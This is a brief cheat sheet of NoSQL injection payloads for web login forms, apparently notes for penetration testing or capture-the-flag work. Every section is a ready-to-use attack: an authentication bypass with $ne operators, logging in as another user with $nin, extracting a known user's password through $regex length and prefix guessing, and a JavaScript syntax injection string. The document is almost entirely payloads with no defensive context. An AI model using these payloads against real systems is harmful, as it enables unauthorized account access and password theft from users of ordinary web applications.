## login bypass
```http
user[$ne]=any&pass[$ne]=any
```

## login as other user
```http
user[$nin][]=admin&user[$nin][]=administrator&pass[$ne]=any
```

## extract password
```bash
# guess password length
user=john&pass[$regex]=^.{8}$&remember=on
# guess characters
user=john&pass[$regex]=^10......$&remember=on
```

## syntax injection
```bash
'||1||'
```
